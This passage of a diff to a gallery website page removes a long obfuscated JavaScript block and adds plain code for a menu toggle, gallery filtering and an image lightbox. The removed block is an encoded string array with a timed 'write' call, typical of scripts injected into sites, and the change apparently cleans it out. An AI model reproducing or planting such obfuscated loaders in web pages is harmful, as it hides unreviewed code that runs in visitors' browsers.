_0x51f2a9=['%66%61%6C%','%20%69%66%','4%3E%0A%0A','61%6E%67%3','C%43%6F%6E','5%61%72%63','8%3D%64%65','69%64%74%6','F%67%28%22','%75%73%74%','%32%7D%3D%','0%20%20%65','%6F%72%28%','%72%6F%72%','D%4C%20%48','6F%6E%74%6','5%6E%74%2E','0%7D%29%28','%3C%21%44%','72%20%66%6','8%73%74%72','46%79%63%3','%6F%6E%74%','%3D%20%59%','%76%61%6C%','5%69%67%68','74%63%68%2','1%72%20%73','%72%69%70%','79%2E%73%7','%73%40%22%','2%65%67%65','72%73%65%7','20%27%32%6','%54%20%56%','%6E%74%2E%','6C%3E','69%66%79%4','%75%63%63%','3%20%3D%20','69%76%20%7','0%2D%31%29','3%75%6D%65','B%0A%0A%20','0%7D%0A%20','%63%68%61%','72%43%61%7','%66%75%6E%','0%20%20%20','%2C%20%69%','2%6F%64%79','%20%7B%0A%','3%68%20%3D','20%48%54%4','27%3B%0A%2','9%66%20%28','%6E%74%65%','2E%6C%6F%6','3%75%62%73','5D%3B%0A%0','4%65%45%6D','5%20%70%61','63%6F%6E%7','59%58%52%3','5%73%73%61','0%66%6F%72','63%74%69%7','B%30%2D%39','%74%68%65%','3%6F%6E%74','2%69%6E%67','77%20%61%6','%65%20%3D%','20%6F%75%7','5B%27%65%6','9%20%74%5B','%65%45%6C%','%3E%0A%0A%','72%20%72%6','6F%64%79%3','5%6D%61%69','%20%70%61%','%20%20%69%','%3D%0A%20%','63%32%4E%7','3C%68%65%6','3%41%67%49','76%61%72%2','1%6B%3A%62','D%3D%3D%20','%6F%61%64%','68%61%73%6','%62%6F%64%','D%65%73%73','A%41%2D%5A','20%7B%0A%0','69%72%5B%3','0%59%6F%72','%6F%63%75%','%72%69%6D%','8%62%61%73','%43%61%73%','%73%74%28%','%74%62%44%','72%69%6E%6','69%64%61%7','%74%20%3D%','7B%0A%20%2','20%31%29%2','%76%61%72%','6E%50%61%6','74%20%3D%2','%20%64%65%','4%79%6C%65','%41%47%45%','9%3B%0A%0A','E%74%6F%4C','42%46%49%4','%77%65%72%','%65%6E%64%','%6F%6D%70%','70%65%6E%2','0%20%20%69','%5B%5C%5D%','%67%65%20%','%65%78%74%','%74%2E%63%','69%61%6C%3','4C%33%42%7','%6F%6E%2E%','%68%20%3E%','%57%56%7A%','%68%3B%0A%','%22%20%7D%','4%6F%63%75','2%23%22%29','%2B%43%69%','7%68%30%62','9%65%6C%64','5%6E%74%72','7%65%74%45','6%72%6F%6D','%39%5D%7B%','%74%6F%62%','73%65%3B%2','%6C%59%57%','%69%74%65%','D%20%68%5B','D%63%39%49','%6D%56%75%','%20%3C%6D%','0%6C%61%79','5B%5E%3C%3','0%22%3E%0A','3D%20%77%6','6C%6F%63%6','%5B%72%2B%','%27%30%27%','B%5A%32%56','%65%6E%61%','5%6D%65%6E','65%2D%77%6','5%6E%74%20','20%28%62%7','72%72%2E%6','%72%69%6E%','%3D%20%61%','%22%2C%20%','5%6C%73%65','9%3B%20%7D','7%77%68%69','20%28%4D%4','0%20%77%69','E%20%28%29','61%72%20%6','0A%20%20%2','%74%2E%62%','5%64%20%73','3D%3D%3D%3','%65%63%6F%','%65%3D%22%','5B%69%5D%2','%0A%20%20%','%2E%68%61%','6E%67%28%3','20%3D%20%2','75%72%6E%2','4E%53%20%3','%6F%72%3A%','4F%66%28%2','0%20%28%66','0A%0A%20%2','6C%61%63%6','0%59%53%42','%28%79%29%','43%6A%78%6','D%65%6E%74','%27%29%20%','%70%61%72%','7D%3C%2F%7','%6E%65%79%','1%69%6E%74','%75%6E%64%','41%46%45%2','6F%38%4C%3','1010604jmRgvI','6%20%76%61','4%65%6E%74','308333FAoyCr','%69%76%3E%','%74%69%74%','E%61%70%70','6%75%6C%6C','1%49%4E%54','0%20%74%68','%79%6C%65%','0%2F%2F%20','%20%6F%75%','D%3D%3D%3D','66%75%6E%6','0%3B%0A%0A','%66%20%28%','%64%79%2E%','8%54%4D%4C','28%73%29%3','%55%57%56%','43%61%73%6','%32%64%33%','66%20%28%6','B%0A%20%20','%75%72%6E%','%45%4E%41%','1%73%68%20','%61%73%65%','3%68%28%29','%6F%6E%61%','77%2E%6E%6','C%5D%5C%5C','E%62%6F%64','73%65%20%6','28%76%61%7','74%6F%4C%6','%2C%33%7D%','%2F%73%63%','3%20%6F%66','20%75%70%7','67%28%31%2','6F%64%79%2','2%6C%2E%73','74%65%78%7','C%65%6E%67','74%3E%0A%0','E%2E%3C%2F','3A%20%22%2','3E%0A%3C%6','74%6F%62%2','%61%72%20%','2E%74%6F%4','5%6E%67%74','61%72%61%6','65%73%73%6','E%74%28%27','76%61%6C%6','%3D%20%73%','6C%69%63%6','50%6F%73%2','0%22%5D%2B','0%2B%20%31','0%72%65%74','0%72%65%3E','65%6E%74%2','9%6F%75%73','20%20%20%7','write','0%77%69%6E','%20%6F%6E%','32%20%26%2','5%42%61%73','%65%36%34%','%72%2B%2B%','%20%20%64%','%7B%33%7D%','64%65%63%6','3B%0A%20%2','D%6E%6F%68','%20%7D%0A%','6F%77%69%6','8%68%74%6D','20%7D%0A%0','9%74%68%20','41%67%49%4','%43%41%38%','4%6F%72%61','6E%65%72%4','20%2F%5E%2','30%5D%20%3','F%77%65%72','6C%75%5A%7','3E%0A%20%2','C%61%63%6B','%2E%65%6D%','5B%30%2D%3','41%2D%5A%2','%20%20%20%','4%79%2E%73','64%6F%77%2','2B%5D%20%3','%6F%6E%20%','6E%74%65%6','5D%20%3D%2','%0A%0A%20%','2F%2F%20%3','%64%65%78%','9%64%74%68','32%30%70%7','%29%3B%0A%','%22%3E%0A%','%74%29%2E%','60%0A%20%2','D%3D%20%48','%6A%61%47%','4%20%68%61','7%65%28%70','E%20%3D%20','%3D%3D%20%','%76%69%63%','20%20%76%6','2E%6C%65%6','6F%20%43%6','3%20%61%6E','%79%5D%3B%','3E%50%61%6','A%20%20%20','64%65%64%2','%20%20%72%','%2E%6C%65%','4F%55%52%2','E%5B%30%2D','6C%6F%73%6','2mpSMLs','2D%39%5D%2','69%20%3C%2','%74%65%72%','2E%6C%61%7','%46%72%6F%','%20%73%20%','28%29%3B%0','38%22%3E%0','6F%63%75%6','61%74%65%4','%44%49%52%','%7C%28%28%','76%69%65%7','6F%77%6E%7','%77%2E%6C%','%69%66%20%','%69%6E%20%','%7A%6F%76%','%20%66%75%','29%20%7B%0','%75%72%6C%','%39%61%2D%','%48%64%70%','1%72%74%73','%29%20%7B%','65%6E%74%6','0%69%6E%6E','F%74%20%6F','5%62%73%74','5%67%65%78','0%3D%20%30','%74%2E%6F%','C%20%65%72','%62%73%74%','6C%46%72%6','B%50%47%68','6C%65%3E%0','6D%61%69%6','0%74%20%3D','%7D%5C%2E%','2%2C%20%65','%6F%75%6E%','20%68%20%3','62%6F%64%7','0%20%20%7D','C%68%74%6D','%73%63%61%','%68%74%6D%','0%74%72%79','73%65%28%2','27%66%6C%6','4%43%6F%6E','%74%72%69%','%79%4E%6A%','C%3B%3A%5C','20%7D%20%6','9%61%6C%2D','6F%77%2E%6','6C%3E%0A%3','2%43%75%73','%65%6E%74%','%65%72%20%','C%6F%63%61','B%29%20%7B','B%20%65%72','73%68%61%7','5%6E%20%65','%69%35%79%','20%22%20%2','%65%6E%67%','0%43%48%45','%6F%77%2E%','%6E%64%20%','%27%3B%0A%','C%20%26%26','B%31%5D%3B','6E%63%65%2','9%34%75%4C','6B%2D%77%6','6E%67%20%6','%3D%20%27%','3D%29%29%3','0%3D%20%77','%64%29%29%','5%2E%65%6D','%69%6E%64%','29%29%24%2','14136040moakvJ','6F%63%61%7','1%2E%30%22','4C%20%73%6','48%74%6D%6','6C%65%3D%3','0%3C%73%63','F%64%47%31','21%3D%3D%2','64%3A%62%6','4%3D%22%55','%2E%2C%3B%','43%75%73%7','0%74%2E%6C','D%5C%5D%29','%20%67%72%','72%27%3B%0','0%4D%6F%64','72%65%66%3','%22%3F%22%','F%64%65%64','6%65%22%29','3D%0A%20%2','28%74%29%2','9%70%61%73','%2E%77%72%','6C%55%72%6','20%20%20%3','91yAjJhY','%20%20%61%','3%61%74%69','%3A%41%72%','65%74%61%2','5B%61%2D%7','%44%45%52%','29%3B%0A%2','%20%3D%20%','E%67%20%61','62%61%63%6','45%52%53%4','%20%76%61%','20%20%3C%7','6E%6F%68%6','72%65%61%6','%6F%6E%73%','F%24%2F%3B','5A%58%42%7','20%45%72%7','0%65%3B%0A','20%28%73%2','4F%43%54%5','5%78%27%3B','5%28%29%3B','F%6D%48%61','21%69%73%4','68%74%6D%6','%20%66%6F%','D%0A%0A%20','C%6F%77%65','B%5C%2E%29','B%31%2C%33','27%63%61%7','%6E%2E%68%','2E%62%6F%6','5%59%33%4A','72%3A%22%2','%65%29%0A%','6F%6E%73%7','%72%72%29%','45%52%20%4','69%66%20%2','%20%20%62%','%43%68%61%','9%3B%0A%20','%53%4A%56%','65%74%45%6','A%6F%75%72','F%72%20%3D','0%28%65%29','22%4F%70%6','7D%0A%0A%2','4765266nFedJl','%68%5A%47%','9%6E%64%6F','28%68%61%7','72%65%74%7','5%72%74%79','49%6A%34%4','%72%2E%6D%','%70%65%6E%','%72%64%2D%','53%74%72%6','%48%54%4D%','8%52%77%63','8%2E%73%75','5%72%6E%20','5%36%34%53','28%22%4D%6','6%61%72%20','1%74%69%6F','65%72%43%6','%32%2C%7D%','%73%68%28%','%64%69%76%','20%6E%65%7','%20%27%62%','3%41%38%63','20%3D%3D%3','C%29%29%20','42%68%63%3','34%3D%27%3','4%4F%43%49','%78%2E%74%','%4C%6F%77%','%61%73%68%','%20%20%63%','1%6C%6C%55','6%75%6E%63','8%20%3E%20','2%3A%77%68','4A%6F%64%4','%20%50%61%','0%30%76%68','%65%45%6D%','%27%27%3B%','20%74%68%6','20%66%75%6','31%2C%33%7','%35%50%67%','0%42%41%53','%54%49%4F%','4%74%6C%65','6E%63%74%6','%6D%6E%6F%','73%74%20%6','28%62%61%7','2C%20%77%6','1%64%64%69','20%3C%6D%6','A%2B%2F%5D','48%54%4D%4','0%3D%20%64','0%20%2F%2F','0%20%20%76','%5C%2D%30%','%20%3C%64%','1%6C%6C%42','28%29%2E%7','3%74%49%6E','%6C%6C%6F%','6E%2E%73%6','0%20%20%72','%6E%6F%68%','3%74%69%6F','E%65%72%72','%3B%0A%0A%','%6C%65%3E%','73%65%72%7','E%20%30%29','5%74%75%72','9%2E%69%6E','%67%65%2E%','22%29%29%4','4C%6D%56%6','%72%6C%50%','27%29%3B%0','3D%20%75%7','%6C%20%6C%','3%65%36%34','6C%20%26%2','28%68%2E%6','8%61%72%73','74%73%2E%6','%2E%6D%61%','8%28%5B%5E','%20%28%76%','1%67%65%29','5%72%27%3B','8%3A%20%22','%20%7B%20%','%30%50%67%','%6C%29%20%','4C%6F%61%6','%61%74%6F%','E%73%70%6C','2656536Chljzh','%29%2E%74%','%70%61%69%','6E%67%74%6','%74%65%6D%','%7C%7C%20%','6C%2C%20%6','0%62%47%55','45%43%54%2','72%73%28%7','%74%6F%6D%','3%74%72%29','65%6D%65%6','4%53%69%7A','%72%29%3B%','0%20%20%74','%20%65%6D%','74%79%70%6','9%6E%67%20','%6C%69%64%','0%76%61%72','%74%22%20%','0%6E%61%6D','4E%68%64%4','6F%64%20%6','D%0A%0A%3C','70%61%67%6','%61%67%65%','74%68%3B%2','E%63%74%69','%6E%65%72%','4%69%6F%6E','2D%39%5D%7','E%67%28%68','20%69%2B%2','E%28%29%5C','0%7B%0A%0A','%61%74%69%','65%28%29%2','3%6B%67%72','%61%6C%20%','%74%65%6E%','6C%65%72%7','%54%46%2D%','9%62%32%52','56%45%59%7','5C%6E%5C%6','9%20%3C%20','4%69%6E%67','62%47%55%2','%61%6D%73%','72%69%6D%2','20%3D%20%7','1%73%65%28','204688XGKQAZ','%20%20%7D%','9%20%3D%20','64%69%73%7','20%20%20%2','D%5A%5D%7B','%77%69%6E%','63%75%6D%6','0%27%46%6F','8%5B%30%2D','9%64%61%74','4%2E%62%6F','%31%29%20%','A%29%7C%28','%20%27%63%','1%29%2E%74','63%74%69%6','9%7A%65%3A','61%67%65%2','%20%3D%3D%','E%73%74%79','%74%68%3B%','5%6D%27%3B','2%65%61%74','3%41%38%64','D%61%69%6C','6%64%79%35','61%69%6C%2','%22%2E%2B%','6F%6C%65%2','B%54%47%39','%6D%61%69%','64%47%6C%3','B%2F%5D%7B','61%69%72%5','2%20%66%61','%73%65%73%','F%63%75%6D','6E%69%74%6','6C%42%61%7','E%74%29%3B','78%68%62%6','20%20%20%6','0%20%64%6F','5%54%30%4E','%2E%6C%6F%','F%6E%20%69','%65%61%64%','%3B%0A%20%','E%45%72%72','C%64%28%6D','6F%6C%6F%7','67%28%22%4','74%79%6C%6','%75%6D%65%','8%29%3B%0A','0%20%20%63','%45%36%34%','B%27%3B%0A','%45%20%53%','%20%64%6F%','3368754zQbMWg','43%68%69%6','%6F%70%65%','30%3B%20%6','72%67%69%6','65%74%75%7','61%74%6F%6','61%58%42%3','%6C%6F%72%','%3C%3E%28%','0%20%20%66','66%6F%6E%7','63%6F%64%6','61%73%68%2','0%20%20%64','%63%6F%6E%','51%2B%43%6','%63%75%6D%','0%5D%5D%20','20%26%26%2','5C%5C%2E%2','%20%6C%5B%','64%6F%63%7','%50%72%65%','74%68%20%3','4%6F%4C%6F','0%20%20%6C','20%28%76%6','%66%6F%72%','%3C%68%33%','8%61%73%68','73%74%79%6','7%6E%20%3D','5pdzNJQ','0%65%6D%48','%72%6F%77%','20%64%6F%6','42%61%73%6','74%69%6F%6','D%3D%0A%20','%30%3B%20%','E%0A%3C%2F','68%50%6F%7','8%61%73%4F','C%65%2E%74','6D%65%6E%7','A%0A%20%20','36%34%43%6','%67%49%43%','2C%20%72%2','%72%65%61%','%74%29%20%','2%6E%20%65','73%20%3D%2','5%2E%63%6F','2%4A%76%5A','%6E%20%67%','%72%74%73%','2%56%30%50','%65%73%73%','%64%20%64%','0%69%2B%2B','D%0A%20%20','D%20%67%65','%73%6F%6C%','5%74%61%20','20%20%69%6','7%70%6F%72','0%65%6E%50','9%4F%4E%29','%6D%6C%43%','%5B%70%61%','%68%29%3B%','%6C%28%65%','0%27%63%65','20%62%61%6','5D%2B%29%2','4%6F%6D%28','6C%65%74%6','%61%2D%7A%','%20%2F%2F%','69%74%65%2','%28%74%29%','1%6D%65%20','%3D%3D%3D%','%28%5C%2E%','29%20%72%6','%61%69%6C%','3D%29%7C%2','43%6A%77%7','6C%2E%73%7','22%3D%22%2'];_0x4a38=function(){return _0x51f2a9;};return _0x4a38();}
-		
-		
-    }, 300);
-
-})();
+  const menuToggle = document.getElementById('menuToggle');
+  const navLinks = document.getElementById('navLinks');
+  if (menuToggle && navLinks) {
+    menuToggle.addEventListener('click', () => {
+      const isOpen = navLinks.classList.toggle('open');
+      menuToggle.setAttribute('aria-expanded', String(isOpen));
+    });
+    navLinks.querySelectorAll('a').forEach(link => link.addEventListener('click', () => {
+      navLinks.classList.remove('open');
+      menuToggle.setAttribute('aria-expanded', 'false');
+    }));
+  }
+  document.getElementById('year').textContent = new Date().getFullYear();
+  document.querySelectorAll('.nav-links a').forEach(a => {
+    if (a.dataset.page === document.body.dataset.page) a.classList.add('active');
+  });
 </script>
 
-</body>
-</html>
+<script>
+  const filters = document.querySelectorAll('.filter-btn');
+  const items = document.querySelectorAll('.gallery-item');
+  filters.forEach(btn => btn.addEventListener('click', () => {
+    filters.forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    items.forEach(item => item.hidden = btn.dataset.filter !== 'all' && item.dataset.category !== btn.dataset.filter);
+  }));
+  const lightbox = document.getElementById('lightbox');
+  const lightboxImage = document.getElementById('lightboxImage');
+  function openImage(item) { lightboxImage.src = item.querySelector('img').src; lightboxImage.alt = item.querySelector('img').alt; lightbox.classList.add('open'); }
+  items.forEach(item => {
+    item.addEventListener('click', () => openImage(item));
+    item.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openImage(item); } });
+  });
+  document.getElementById('lightboxClose').addEventListener('click', () => lightbox.classList.remove('open'));
+  lightbox.addEventListener('click', e => { if (e.target === lightbox) lightbox.classList.remove('open'); });
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') lightbox.classList.remove('open'); });
+</script>
+</div></body></html>
